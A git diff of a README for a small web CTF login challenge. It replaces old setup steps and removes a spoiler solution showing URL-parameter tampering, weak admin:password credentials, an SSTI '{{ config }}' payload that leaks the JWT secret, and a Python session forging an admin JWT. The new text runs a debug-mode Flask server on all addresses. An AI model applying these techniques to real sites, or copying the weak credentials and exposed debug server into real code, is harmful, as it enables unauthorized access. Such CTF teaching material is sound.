@@ -1,106 +1,54 @@
-# LoginChallenge2022
-Mini CTF challenge for the September 2022 Activity Fair
+# LoginChallenge2025
+Mini CTF challenge for the September 2025 Activity Fair - A modified version of [LoginChallenge2022](https://github.com/ShefESH/LoginChallenge2022)
 
+> Note - This was written and tested on Windows 10, as such I cannot ensure that it will function correctly on other OS
 ## Install + Setup
 
-### Using poetry
+### Using venv
 
-Install poetry for your platform
-
+In the root directory run
 ``` sh
-# Enter project dir
-cd web
-# Install dependencies
-poetry install
-# Run application
-poetry run flask run
+python -m venv venv
+```
+> Or python3 depending on your OS
+
+Then activate the virtual environment
+
+Windows:
+``` sh
+.\venv\Scripts\activate  
 ```
 
-
-### Install Flask
-
-**Windows**
-
-Install Python:
-
-https://www.python.org/downloads/release/python-397/
-
-Set PATH:
-- Start > Edit Environment Variables
-- Add Python install directory to both System and Environment variables
-
-Check python installed:
-
-```
-PS > python --version
+MacOS / Linux:
+``` sh
+source .\venv\bin\activate
 ```
 
-Install flask and other dependencies:
-
-```
-PS > python -m pip install -r requirements.txt
-```
-
-**Linux**
-
-```
-$ python3 -m pip install -r requirements.txt
+### Install required packages
+After initialising your venv, your terminal window should now have ```(venv)``` at the start of each command (if not, see above)
+Now run this command from the root of the project
+``` sh
+pip install -r .\requirements.txt
 ```
 
-## Run
-
-### Windows
-
-```
-PS > cd .\web\
-PS > $env:FLASK_APP = "app"
-PS > $env:FLASK_DEBUG = "true"
-PS > python -m flask run
+### Starting the webserver
+Once all the packages are installed run:
+``` sh
+python .\web\app.py
 ```
 
-## Solution
-
-### Part 1
-
-
-<details>
-
-<summary>Spoilers</summary>
-
-Change the `http://localhost:5000/?loginSuccessful=False` parameter to `True`
-
-OR
-
-Guess the weak credentials `admin`:`password`
-
-</details>
-
-### Part 2
-
-
-<details>
-
-<summary>Spoilers</summary>
-
-Leak app secret with SSTI, submitting `{{ config }}` as username. This will take you to a page that displays the `JWT_SECRET_KEY` parameter. This key is used to sign JWT cookies.
-
-THEN
-
-Inspect the JWT to see `is_admin` parameter and forge a new cookie, using the following `jwt` library to import the `JWT_SECRET_KEY` as `secret`.
-
+You should then see a message like this in the terminal:
+```sh
+(venv) PS C:\Projects\LoginChallenge2025> python .\web\app.py
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:2346
+ * Running on http://<Network IP>:2346
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 140-122-765
 ```
-$ python
->>> import jwt
->>> token = 'eyJ0....K3FA'
->>> secret = ';nod87b;/dfub6vaz.knib'
->>> jwt.decode(token, secret, "HS256") 
-{'fresh': False, 'iat': 1663444862, 'jti': '6b0f4003-7579-41cc-bc30-c0fb9c4e3ef3', 'type': 'access', 'sub': {'is_admin': False}, 'nbf': 1663444862, 'csrf': 'fbcf88b6-684e-42e7-8d7d-1de3fd65b58e', 'exp': 1663445762}
->>> j = jwt.decode(token, secret, "HS256") 
->>> j['sub'] = {'is_admin': True}
->>> jwt.encode(j, secret)
-'eyJ0...ncRo'
-```
-
-Replace the `access_token_cookie` with this new value and reload the page.
-
-</details>
+> It is up to you as to whether you want to run the server on the local network or not, if not remove the 'host' from app.run() in app.py
